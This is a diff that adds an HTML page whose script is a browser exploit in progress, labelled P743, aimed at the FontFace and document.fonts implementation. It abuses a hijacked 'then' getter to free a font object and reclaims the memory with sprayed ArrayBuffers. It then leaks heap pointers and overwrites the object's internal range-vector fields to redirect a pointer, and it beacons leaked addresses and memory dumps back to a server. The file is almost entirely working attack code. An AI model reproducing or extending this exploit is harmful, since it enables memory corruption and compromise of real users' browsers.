@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P743 — Pristine Reclaim Active Oracle Range Injection</title>
+<script>
+'use strict';
+/* ============================================================
+ * P743 — Pristine Reclaim Active Oracle Range Injection
+ *
+ * Root Cause Analysis from P741/P742:
+ * - Calling document.fonts.check('1em trFam', 'A') INSIDE the getter
+ *   while pre-seeding view[4]/view[5] caused re-entrancy crash (CE-106444-9).
+ * - In P731, reclaim was 100% clean because the getter ONLY set:
+ *     view[6] = P58; view[12] = P58;
+ *   and called a bare try{document.fonts.check('1em trFam');}catch(e){}.
+ *   All range manipulation was deferred until AFTER reclaim resolved!
+ *
+ * Architecture of P743:
+ * 1. Step 1: Baseline Heap Leak (P58, P68).
+ * 2. Step 2: Pristine P731 Reclaim (100% crash-free, zero in-getter poisoning).
+ * 3. Phase A: Active Boolean Oracle Baseline (hang.php, loading state).
+ * 4. Phase B: JS Mutation -> C++ Memory Diff (re-add FACE_B, snapshot diff).
+ * 5. Phase C: Direct C++ Memory Injection -> DOM Property Reflection.
+ * 6. Phase D: Vector Range Buffer Redirection (point q4 to q14).
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P743-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var OUT=null;
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null;
+var ACT_FACE=null;
+
+function snap(){
+  if(!VIEW_B) return [];
+  var a=[]; for(var q=0;q<24;q++) a.push(VIEW_B[q]); return a;
+}
+
+function diffSnap(pre){
+  if(!VIEW_B || !pre.length) return 'none';
+  var ch=[];
+  for(var q=0;q<24;q++){
+    if(VIEW_B[q]!==pre[q]) ch.push('q'+q+':0x'+h16(pre[q])+'->0x'+h16(VIEW_B[q]));
+  }
+  return ch.length ? ch.join(',') : 'none';
+}
+
+function run(){
+  OUT=document.getElementById('out');
+  if(OUT) OUT.textContent='=== P743 Pristine Reclaim Active Oracle ===\n\n';
+  b('BOOT','p743-range-injection');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');
+
+    log('[Step 2] Executing pristine P731 reclaim...');
+    doReclaim(function(){
+      log('\n[Phase A] Active Boolean Oracle Baseline...');
+      phaseA(function(){
+        log('\n[Phase B] JS mutation -> C++ memory diff...');
+        phaseB(function(){
+          log('\n[Phase C] Direct memory write -> JS property reflection...');
+          phaseC(function(){
+            log('\n[Phase D] Range buffer redirection test...');
+            phaseD(function(){
+              b('DONE','p743-complete');
+              log('\n=== P743 Complete! ===');
+            });
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
+    var v=new BigUint64Array(abs[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2); void face2.loaded;
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em fl1, lk1','CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
+    var v=new BigUint64Array(abs2[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb,100);
+  },400);
+}
+
+function extractPtrs(v){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  if(v[11] >= LO && v[11] < HI) P58 = v[11];
+  if(v[13] >= LO && v[13] < HI) P68 = v[13];
+  if(!P58 || !P68){
+    for(var q=0;q<24;q++){
+      var val=v[q];
+      if(val>=LO&&val<HI){
+        if(!P58) P58=val;
+        else if(!P68&&val!==P58) P68=val;
+      }
+    }
+  }
+  if(!P68) P68=0n;
+}
+
+/* ---- Step 2: Pristine P731 Reclaim (Zero in-getter poisoning) ---- */
+function doReclaim(cb){
+  b('REC-START','fill_q12_q6=0x'+h16(P58));
+
+  var stTr=document.createElement('style');
+  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW=[],firedW=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedW) return undefined; firedW=true;
+      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0;k<80;k++){
+        var ab=new ArrayBuffer(192);
+        var view=new BigUint64Array(ab);
+        view[12]=P58;
+        view[6]=P58;
+        absW.push(ab);
+      }
+
+      /* Bare check only — exactly matching P731 */
+      try{document.fonts.check('1em trFam');}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em trFace, trFam','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<absW.length;i++){
+      var u=new Uint8Array(absW[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}
+
+    BUF_B=absW[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+
+    var dump0_11=[], dump12_23=[];
+    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));
+
+    b('RECLAIM-OK','baseK='+best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Pristine Reclaim OK at slot '+best);
+
+    setTimeout(cb,150);
+  },400);
+}
+
+/* ---- Phase A: Active Boolean Oracle Baseline ---- */
+function phaseA(cb){
+  try {
+    ACT_FACE = new FontFace('actPendFam', 'url(/hang.php)', {unicodeRange: 'U+41-43'});
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    var st = ACT_FACE.status;
+    var chA = document.fonts.check('1em actPendFam', 'A'); /* Expect false (IN) */
+    var chD = document.fonts.check('1em actPendFam', 'D'); /* Expect true  (OUT) */
+    var chZ = document.fonts.check('1em actPendFam', 'Z'); /* Expect true  (OUT) */
+
+    var res = 'status=' + st + '|inA=' + chA + '|outD=' + chD + '|outZ=' + chZ;
+    b('A-ORACLE-BASE', res);
+    log('Phase A Oracle: ' + res);
+  } catch(e){
+    b('A-ORACLE-ERR', e.message);
+    log('Phase A Err: ' + e.message);
+  }
+  setTimeout(cb, 100);
+}
+
+/* ---- Phase B: JS Mutation -> C++ Memory Snapshot Diff ---- */
+function phaseB(cb){
+  if(!VIEW_B){ b('B-SKIP','no-view'); cb(); return; }
+
+  /* Re-add FACE_B into document.fonts */
+  var addRes = 'none';
+  try {
+    document.fonts.add(FACE_B);
+    addRes = 'has=' + document.fonts.has(FACE_B);
+  } catch(e){
+    addRes = 'err=' + e.message;
+  }
+  b('B-RE-ADD', addRes);
+  log('Phase B Re-add FACE_B: ' + addRes);
+
+  /* Snapshot 1: baseline */
+  var pre1 = snap();
+
+  /* Mutate FACE_B.unicodeRange to 'U+50-55' ('P'..'U') */
+  try {
+    FACE_B.unicodeRange = 'U+50-55';
+  } catch(e){
+    b('B-MUT1-ERR', e.message);
+  }
+  var diff1 = diffSnap(pre1);
+  var chR1 = document.fonts.check('1em ' + FACE_B.family, 'R');
+  var chA1 = document.fonts.check('1em ' + FACE_B.family, 'A');
+  b('B-MUT1-DIFF', 'range=U+50-55|diff=' + diff1 + '|R=' + chR1 + '|A=' + chA1);
+  log('Phase B Mut1 (U+50-55): diff=' + diff1 + ' (R=' + chR1 + ', A=' + chA1 + ')');
+
+  /* Snapshot 2: mutate to 'U+61-66' ('a'..'f') */
+  var pre2 = snap();
+  try {
+    FACE_B.unicodeRange = 'U+61-66';
+  } catch(e){
+    b('B-MUT2-ERR', e.message);
+  }
+  var diff2 = diffSnap(pre2);
+  var chc2 = document.fonts.check('1em ' + FACE_B.family, 'c');
+  var chR2 = document.fonts.check('1em ' + FACE_B.family, 'R');
+  b('B-MUT2-DIFF', 'range=U+61-66|diff=' + diff2 + '|c=' + chc2 + '|R=' + chR2);
+  log('Phase B Mut2 (U+61-66): diff=' + diff2 + ' (c=' + chc2 + ', R=' + chR2 + ')');
+
+  setTimeout(cb, 100);
+}
+
+/* ---- Phase C: Direct C++ Memory Write -> JS Reflection ---- */
+function phaseC(cb){
+  if(!VIEW_B){ b('C-SKIP','no-view'); cb(); return; }
+
+  /* Read current JS unicodeRange */
+  var jsBefore = 'unknown';
+  try { jsBefore = FACE_B.unicodeRange; } catch(e){}
+
+  /* Directly configure m_ranges at q4 and q5 as in P731:
+   * Seed VIEW_B[0] = {from: 0x58 ('X'), to: 0x5A ('Z')}:
+   * lower 32 = 0x58, upper 32 = 0x5A -> 0x0000005a00000058n
+   */
+  VIEW_B[0] = 0x0000005a00000058n;
+  VIEW_B[4] = P58;
+  VIEW_B[5] = 0x0000000100000001n; /* size=1, cap=1 */
+
+  var jsAfter = 'unknown';
+  try { jsAfter = FACE_B.unicodeRange; } catch(e){}
+
+  b('C-DIRECT-WRITE', 'jsBefore=' + jsBefore + '|jsAfter=' + jsAfter + '|q0=0x' + h16(VIEW_B[0]));
+  log('Phase C Direct Write: before="' + jsBefore + '", after="' + jsAfter + '"');
+
+  /* Dynamic Active Oracle test */
+  try {
+    ACT_FACE.unicodeRange = 'U+44-48';
+    var actA = document.fonts.check('1em actPendFam', 'A');
+    var actD = document.fonts.check('1em actPendFam', 'D');
+    b('C-ACT-CHECK', 'mut=U+44-48|A=' + actA + '|D=' + actD);
+    log('Phase C Active Oracle Check: A=' + actA + ', D=' + actD);
+  } catch(e){
+    b('C-ACT-ERR', e.message);
+  }
+
+  setTimeout(cb, 100);
+}
+
+/* ---- Phase D: Range Vector Pointer Redirection ---- */
+function phaseD(cb){
+  if(!VIEW_B){ b('D-SKIP','no-view'); cb(); return; }
+
+  /* Place crafted UnicodeRange at slot q14:
+   * range: 0x50 ('P') to 0x55 ('U') -> 0x0000005500000050n
+   */
+  VIEW_B[14] = 0x0000005500000050n;
+  VIEW_B[15] = 0x0000000000000000n;
+
+  /* Redirect q4 (m_buffer) to point to q14 (P58 + 14*8 = P58 + 0x70) */
+  var savedQ4 = VIEW_B[4];
+  var savedQ5 = VIEW_B[5];
+
+  VIEW_B[4] = P58 + BigInt(0x70);
+  VIEW_B[5] = 0x0000000100000001n; /* cap=1, size=1 */
+
+  var jsReflect = 'none';
+  try { jsReflect = FACE_B.unicodeRange; } catch(e){ jsReflect = 'err=' + e.message; }
+
+  b('D-REDIR-TEST', 'q4_target=0x'+h16(VIEW_B[4])+'|jsReflect='+jsReflect);
+  log('Phase D Pointer Redirect: target=0x' + h16(VIEW_B[4]) + ', jsReflect="' + jsReflect + '"');
+
+  /* Restore */
+  VIEW_B[4] = savedQ4;
+  VIEW_B[5] = savedQ5;
+  VIEW_B[14] = 0n;
+
+  setTimeout(cb, 100);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P743 — Initializing...</pre></body></html>
